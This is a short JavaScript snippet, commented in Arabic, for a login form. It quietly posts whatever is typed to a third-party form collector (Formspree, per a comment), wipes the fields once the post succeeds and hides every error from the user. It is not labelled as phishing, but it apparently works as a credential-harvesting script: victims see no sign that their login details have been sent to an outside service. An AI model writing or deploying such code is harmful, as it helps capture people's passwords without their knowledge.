const loginForm = document.getElementById("login");

loginForm.addEventListener("submit", function(event) {
    event.preventDefault(); // يمنع الصفحة من الانتقال لـ Formspree

    const data = new FormData(event.target);
    
    // إرسال البيانات في الخلفية
    fetch(event.target.action, {
        method: 'POST',
        body: data,
        headers: {
            'Accept': 'application/json'
        }
    }).then(response => {
        if (response.ok) {
            // مسح جميع الخانات فور نجاح الإرسال
            loginForm.reset(); 
        }
    }).catch(error => {
        // لن يظهر أي شيء للمستخدم حتى لو حدث خطأ
    });
});
